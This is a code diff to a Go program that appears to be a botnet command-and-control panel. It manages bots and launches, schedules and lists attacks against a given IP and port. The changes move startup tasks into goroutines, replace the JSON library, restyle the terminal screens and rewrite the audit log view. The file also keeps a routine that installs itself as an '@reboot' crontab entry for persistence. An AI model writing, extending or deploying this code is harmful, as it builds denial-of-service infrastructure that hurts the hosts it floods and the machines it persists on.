@@ -10,7 +10,6 @@ import (
 	"crypto/x509"
 	"encoding/base64"
 	"encoding/hex"
-	"encoding/json"
 	"fmt"
 	"io"
 	"net"
@@ -24,6 +23,7 @@ import (
 	"time"
 	"unicode"
 
+	jsoniter "github.com/json-iterator/go"
 	"golang.org/x/crypto/bcrypt"
 	"golang.org/x/time/rate"
 )
@@ -149,8 +149,7 @@ type AggregatedStats struct {
 	UnhealthyBots int
 }
 
-type LogEntry struct {
-}
+var json = jsoniter.ConfigCompatibleWithStandardLibrary
 
 const (
 	ColorStart   = "237"
@@ -215,9 +214,8 @@ func logAuditEvent(user, event, details string) {
 		user,
 		event,
 		details)
-	fmt.Println(logEntry) // Print to terminal
+	fmt.Println(logEntry)
 
-	// Optional: Keep simple file logging without async
 	file, err := os.OpenFile(cfg.AuditLogFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
 	if err == nil {
 		fmt.Fprintln(file, logEntry)
@@ -251,32 +249,41 @@ func main() {
 		fmt.Printf("Failed to load config: %v\n", err)
 		os.Exit(1)
 	}
+
 	if err := validateConfig(); err != nil {
 		fmt.Printf("Invalid config: %v\n", err)
 		os.Exit(1)
 	}
 
 	signingKey = []byte(cfg.CommandSigningKey)
-
 	connSemaphore = make(chan struct{}, cfg.MaxConns)
-	if err := checkCertificates(); err != nil {
-		logAuditEvent("SYSTEM", "STARTUP", fmt.Sprintf("Certificate error: %v", err))
-		os.Exit(1)
+
+	go func() {
+		if err := checkCertificates(); err != nil {
+			logAuditEvent("SYSTEM", "STARTUP", fmt.Sprintf("Certificate error: %v", err))
+		}
+	}()
+
+	go initializeAuditLog()
+
+	time.AfterFunc(100*time.Millisecond, rotateLogs)
+	time.AfterFunc(200*time.Millisecond, cleanBlockedIPs)
+	time.AfterFunc(300*time.Millisecond, cleanSessions)
+	time.AfterFunc(400*time.Millisecond, cleanRateLimiters)
+	time.AfterFunc(500*time.Millisecond, updateTitle)
+	time.AfterFunc(600*time.Millisecond, func() {
+		attackManagerInstance.checkScheduledAttacks()
+	})
+	time.AfterFunc(700*time.Millisecond, logSystemStats)
+
+	if cfg.DDOSProtection {
+		go setupFirewallRules()
 	}
 
-	initializeAuditLog()
-	initializeRootUser()
-	setupFirewallRules()
+	go initializeRootUser()
 
-	go rotateLogs()
-	go cleanBlockedIPs()
-	go cleanSessions()
-	go cleanRateLimiters()
-	go updateTitle()
-	go attackManagerInstance.checkScheduledAttacks()
-	go logSystemStats()
-	startServers()
 	setupCronJob()
+	startServers()
 }
 
 func loadConfig() (*Config, error) {
@@ -428,9 +435,9 @@ func handleUserConnection(conn net.Conn) {
 		removeClient(conn)
 	}()
 
-	conn.SetDeadline(time.Now().Add(30 * time.Second))      // connection timeout
-	conn.SetReadDeadline(time.Now().Add(30 * time.Second))  //  read timeout
-	conn.SetWriteDeadline(time.Now().Add(30 * time.Second)) //  write timeout
+	conn.SetDeadline(time.Now().Add(30 * time.Second))
+	conn.SetReadDeadline(time.Now().Add(30 * time.Second))
+	conn.SetWriteDeadline(time.Now().Add(30 * time.Second))
 
 	tlsConn, ok := conn.(*tls.Conn)
 	if !ok {
@@ -506,12 +513,14 @@ func generateSessionID() (string, error) {
 }
 
 func setupCronJob() {
-	cmd := exec.Command("crontab", "-l")
-	output, _ := cmd.CombinedOutput()
-	if !strings.Contains(string(output), os.Args[0]) {
-		cmd = exec.Command("sh", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo \"@reboot %s\") | crontab -", os.Args[0]))
-		cmd.Run()
-	}
+	go func() {
+		cmd := exec.Command("crontab", "-l")
+		output, _ := cmd.CombinedOutput()
+		if !strings.Contains(string(output), os.Args[0]) {
+			cmd = exec.Command("sh", "-c", fmt.Sprintf("(crontab -l 2>/dev/null; echo \"@reboot %s\") | crontab -", os.Args[0]))
+			cmd.Run()
+		}
+	}()
 }
 
 func secureDelete(path string) error {
@@ -801,11 +810,10 @@ func setTitle(conn net.Conn, title string) {
 func updateTitle() {
 	spinChars := []rune{'⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'}
 	spinIndex := 0
-	ticker := time.NewTicker(1 * time.Second) // Reduced from 100ms
+	ticker := time.NewTicker(1 * time.Second)
 	defer ticker.Stop()
 
 	for range ticker.C {
-		// Cache values to avoid repeated calls
 		attackCount := attackManagerInstance.countAttacks()
 		botCount := getBotCount()
 		uptime := time.Since(serverStartTime).Round(time.Second)
@@ -1282,7 +1290,7 @@ func handleCancelAttack(conn net.Conn, parts []string, c *client) {
 }
 
 func displayAttackLaunch(conn net.Conn, method, ip, port, duration string) {
-	conn.Write([]byte("\033[2J\033[3J\033[2J\033[H"))
+	conn.Write([]byte("\033[2J\033[H"))
 	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
 		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
 	conn.Write([]byte(border))
@@ -1307,7 +1315,7 @@ func displayOngoingAttacks(conn net.Conn) {
 		animateText(conn, "No ongoing attacks found.\n\r", 15*time.Millisecond, ColorInfo)
 		return
 	}
-	conn.Write([]byte("\033[2J\033[3J\033[2J\033[H"))
+	conn.Write([]byte("\033[2J\033[H"))
 	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
 		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
 	conn.Write([]byte(border))
@@ -1338,7 +1346,7 @@ func displayOngoingAttacks(conn net.Conn) {
 
 func displayBotCount(conn net.Conn) {
 	count := getBotCount()
-	conn.Write([]byte("\033[2J\033[3J\033[2J\033[H"))
+	conn.Write([]byte("\033[2J\033[H"))
 	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
 		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
 	conn.Write([]byte(border))
@@ -1353,7 +1361,7 @@ func displayBotCount(conn net.Conn) {
 }
 
 func displayHelp(conn net.Conn, userLevel int) {
-	conn.Write([]byte("\033[2J\033[3J\033[2J\033[H"))
+	conn.Write([]byte("\033[2J\033[H"))
 	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
 		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
 	conn.Write([]byte(border))
@@ -1413,7 +1421,7 @@ func displayUserDatabase(conn net.Conn) {
 	data, _ := io.ReadAll(file)
 	var users []User
 	json.Unmarshal(data, &users)
-	conn.Write([]byte("\033[2J\033[3J\033[2J\033[H"))
+	conn.Write([]byte("\033[2J\033[H"))
 	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
 		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
 	conn.Write([]byte(border))
@@ -1562,23 +1570,53 @@ func handleResetPassword(conn net.Conn, c *client, parts []string) {
 }
 
 func displayAuditLogs(conn net.Conn) {
-	file, _ := os.Open(cfg.AuditLogFile)
-	defer file.Close()
-	conn.Write([]byte("\033[2J\033[H"))
-	fmt.Fprintf(conn, "%-25s %-15s %-20s %-30s\n", "Timestamp", "User", "Event", "Details")
-	fmt.Fprintf(conn, "%-25s %-15s %-20s %-30s\n", strings.Repeat("-", 25), strings.Repeat("-", 15), strings.Repeat("-", 20), strings.Repeat("-", 30))
-	scanner := bufio.NewScanner(file)
-	lines := 0
-	for scanner.Scan() && lines < 100 {
-		var logEntry AuditLog
-		json.Unmarshal([]byte(scanner.Text()), &logEntry)
-		fmt.Fprintf(conn, "%-25s %-15s %-20s %-30s\n",
-			logEntry.Timestamp.Format("2006-01-02 15:04:05"),
-			truncateString(logEntry.User, 15),
-			truncateString(logEntry.Event, 20),
-			truncateString(logEntry.Details, 30))
-		lines++
+	const maxLines = 20
+
+	file, err := os.Open(cfg.AuditLogFile)
+	if err != nil {
+		animateText(conn, "Error opening audit log", 15*time.Millisecond, ColorError)
+		return
 	}
+	defer file.Close()
+
+	conn.Write([]byte("\033[2J\033[H"))
+
+	border := fmt.Sprintf("\033[38;5;%sm+\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[38;5;%sm-\033[0m\n\r",
+		ColorStart, ColorMid1, ColorMid2, ColorMid3, ColorEnd)
+	conn.Write([]byte(border))
+	title := fmt.Sprintf("\033[38;5;%sm|\033[38;5;%sm    AUDIT LOG (LAST %d ENTRIES)    \033[0m\n\r",
+		ColorMid1, ColorSystem, maxLines)
+	conn.Write([]byte(title))
+	conn.Write([]byte(border))
+
+	lines := make([]string, 0, maxLines)
+	scanner := bufio.NewScanner(file)
+
+	for scanner.Scan() {
+		line := scanner.Text()
+		if len(lines) >= maxLines {
+			lines = lines[1:]
+		}
+		lines = append(lines, line)
+	}
+
+	if err := scanner.Err(); err != nil {
+		animateText(conn, "Error reading log file", 15*time.Millisecond, ColorError)
+		return
+	}
+
+	for _, line := range lines {
+		if len(line) > 120 {
+			line = line[:117] + "..."
+		}
+		fmt.Fprintf(conn, "%s\n\r", line)
+	}
+
+	conn.Write([]byte(border))
+	animateText(conn, "Press any key to continue...", 15*time.Millisecond, ColorInfo)
+
+	buf := make([]byte, 1)
+	conn.Read(buf)
 }
 
 func displayServerStatus(conn net.Conn) {
@@ -1731,13 +1769,11 @@ func initializeRootUser() {
 		users = append(users, rootUser)
 		saveUsers(users)
 
-		// Print to terminal (stdout)
 		fmt.Printf("\n[!] Root user created for the first time.\n")
 		fmt.Printf("[!] Username: root\n")
 		fmt.Printf("[!] Password: %s\n", password)
 		fmt.Printf("[!] Store this password securely. It will not be shown again.\n\n")
 
-		// Log to audit (as before)
 		logAuditEvent("SYSTEM", "INIT", "Root user created")
 	}
 }
